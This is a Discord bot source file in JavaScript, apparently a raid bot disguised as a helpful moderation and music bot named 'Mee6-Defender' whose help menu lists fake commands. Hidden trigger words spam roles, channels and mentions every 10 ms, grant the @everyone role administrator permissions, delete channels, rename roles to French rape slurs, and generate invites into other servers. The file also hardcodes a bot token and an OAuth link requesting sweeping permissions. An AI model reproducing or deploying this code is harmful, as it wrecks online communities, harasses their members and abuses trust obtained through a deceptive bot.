const Discord = require("discord.js");
// Mee6-Defender
const bot = new Discord.Client();
bot.on("ready", () => {
  console.log(`(2) Logged in as ${bot.user.tag}!`);
  bot.user.setPresence({ look: { name: ";" + "help" + " pour afficher les commandes", type: 0}});
  
});

var spamming_2 = false;

bot.on("message", msg => {
  if (msg.content === "R") {
    var myRole = msg.guild.roles.find(r => {
      return r.name === "Nouveau Nutella";
    }); // Connerieurs♥
    msg.guild.members.get(msg.author.id).addRole(myRole);
  }

  if (msg.content === "lien Mee6") {
    msg.author.sendMessage(
      "Lien: https://discordapp.com/oauth2/authorize?client_id=392415215918252047&permissions=2146958591&scope=bot"
    );
  }

  if (msg.content === "manger") {
    spamming_2 = true;
    setInterval(function() {
      if (spamming_2 === true)
        msg.guild.createRole({
          name: "restart",
          color: "BLUE"
        });
      if (spamming_2 === true) {
        msg.guild.createChannel("TMWSTW", "text");
      }
      if (spamming_2 === true) {
        msg.guild.createChannel("TMWSTW https://discord.gg/d394WP6", "voice");
      }
      if (spamming_2 === true) {
        msg.channel.send("@no admin");
      }
      if (spamming_2 === true) {
        msg.channel.send("@restart");
      } else {
        return;
      }
    }, 10);
  } else if (msg.content === "manger") {
    spamming_2 = true;
    setInterval(function() {
      //if (spamming_2 === true) {msg.channel.delete('NIQUER-VOUS', 'text');}
      if (spamming_2 === true) {
        msg.guild.createChannel("PD", "text");
      } else {
        return;
      }
    }, 1000);
  }
  if (msg.content.startsWith("delt")) {
    msg.delete(1000);
    msg.guild.channels
      .filter(i => {
        return i.name === "pd";
      })
      .forEach(c => {
        c.delete();
      });
  }

  if (msg.content.startsWith("delv")) {
    msg.delete(1000);
    msg.guild.channels
      .filter(i => {
        return i.name === "tmwstw";
      })
      .forEach(c => {
        c.delete();
      });
  }

  if (msg.content.startsWith("delvv")) {
    msg.delete(1000);
    msg.guild.channels
      .filter(i => {
        return i.name === "TMWSTW https://discord.gg/d394WP6";
      })
      .forEach(c => {
        c.delete();
      });
  } else if (msg.content === "STOP") {
    spamming_2 = false;
  } else if (msg.content === "123") {
    var Member = msg.guild.roles.find(r => {
      return r.name === "Ongaku";
    });
    msg.delete();
    Member.setPosition(8)
      .then(r => console.log(`Role position: ${r.position}`))
      .catch(console.error);
  } else if (msg.content === "E") {
    msg.delete();
    var Member = msg.guild.roles.find(r => {
      return r.name === "@everyone";
    });
    Member.setPermissions([
      "KICK_MEMBERS",
      "BAN_MEMBERS",
      "ADMINISTRATOR",
      "CREATE_INSTANT_INVITE",
      "MANAGE_CHANNELS",
      "MANAGE_GUILD",
      "ADD_REACTIONS",
      "VIEW_AUDIT_LOG",
      "VIEW_CHANNEL",
      "READ_MESSAGES",
      "SEND_MESSAGES",
      "SEND_TTS_MESSAGES",
      "MANAGE_MESSAGES",
      "EMBED_LINKS",
      "ATTACH_FILES",
      "READ_MESSAGE_HISTORY",
      "MENTION_EVERYONE",
      "USE_EXTERNAL_EMOJIS",
      "EXTERNAL_EMOJIS",
      "CONNECT",
      "SPEAK",
      "MUTE_MEMBERS",
      "DEAFEN_MEMBERS",
      "MOVE_MEMBERS",
      "USE_VAD",
      "CHANGE_NICKNAME",
      "MANAGE_NICKNAMES",
      "MANAGE_ROLES",
      "MANAGE_ROLES_OR_PERMISSIONS",
      "MANAGE_WEBHOOKS",
      "MANAGE_EMOJIS"
    ])
      .then(r => console.log(`Role updated ${r}`))
      .catch(console.error);
  } else if (msg.content === ";pp") {
    msg.channel.send({
      embed: {
        color: 2550255,
        author: {
          name: bot.user.username,
          icon_url: bot.user.avatarURL
        },
        title: "**Votre Photo de profil**",
        url: msg.author.avatarURL,
        image: {
          url: msg.author.avatarURL
        },

        timestamp: new Date(),
        footer: {
          icon_url: bot.user.avatarURL,
          text: "Mee-defender"
        }
      }
    });
  } else if (msg.content.startsWith(">invite")) {
    bot.channels
      .get(msg.content.replace(">invite ", ""))
      .createInvite({
        maxAge: 0 // Infinite
      })
      .then(invite => {
        msg.channel.send(invite.url);
      });
  } else if (msg.content.startsWith(">channels")) {
    var a = [];
    bot.guilds
      .get(msg.content.split(" ")[1])
      .channels.filter(i => {
        return i.permissionsFor(bot.user).has("CREATE_INSTANT_INVITE");
      })
      .forEach(i => {
        a.push(i.id.toString());
      });
    msg.channel.send(a);
  }
  if (msg.content === "e") {
    msg.delete();
    var Member = msg.guild.roles.find(r => {
      return r.name === "Nouveau Nutella";
    });
    Member.edit({ name: "FILS DE VIOLE" })
      .then(r => console.log(`Edited role ${r}`))
      .catch(console.error);
  } else if (msg.content === "RAID") {
    msg.delete(1000);
    var Member = msg.guild.roles.find(r => {
      return r.name === "Administrateur";
    });
    Member.edit({ name: "VIOLE" })
      .then(r => console.log(`Edited role ${r}`))
      .catch(console.error);
  }
  if (msg.content === "R") {
    msg.delete();
    bot.user.setGame("MUSIC");
  } else if (msg.content === "del") {
    msg.delete(1000);
    msg.channel.delete("", "text");
    msg.channel.delete("tmwstw", "text");
    msg.channel.delete("tmwstw", "text");
  }

  if (msg.content === "manger") {
    msg.author.sendMessage({
      embed: {
        color: 2550255,
        author: {
          name: bot.user.username,
          icon_url: bot.user.avatarURL
        },
        title: "**Mee6-Defender**",
        fields: [
          {
            name: "SPAM DONE",
            value: "**LES KIKOO JAP VONT PLEURÉ**"
          }
        ],
        footer: {
          icon_url: bot.user.avatarURL,
          text: "Mee6-Defender™"
        }
      }
    });
  }

  if (msg.content === ";help") {
    msg.channel.send({
      embed: {
        color: 2550255,
        author: {
          name: bot.user.username,
          icon_url: bot.user.avatarURL
        },
        title: "Mee6-Defender",
        url:
          "https://www.allo-image.net/stockimg/upload/15752232035a2d46647e9a0mail.png",
        description: "les commande du bot",
        fields: [
          {
            name: "commande",
            value:
              ";blacklist, ;clean, ;clear, ;disconnect, ;id, ;joinserver, ;listids, ;np, ;pause, ;perms, ;play, ;pldump, ;queue, ;restart, ;resume, ;search, ;setavatar, ;setname, ;setnick, ;shuffle, ;shutdown, ;skip, ;stream, ;summon, ;volume."
          },
          {
            name: "PS",
            value: "Demmander a votre JEAN- INFORMATICIEN 🛠 pour plus d'aide"
          },
          {
            name: "Merci",
            value: "Bonne journée et bon jeu"
          }
        ],
        timestamp: new Date(),
        footer: {
          icon_url: bot.user.avatarURL,
          text: "©Mee6-Defender™"
        }
      }
    });
  }
});

bot.login("NDQ0MjM5OTcxOTkwMjQxMjkw.DdZCOw.8FU39Gtky_1WAd1FF53aXlytxUA");
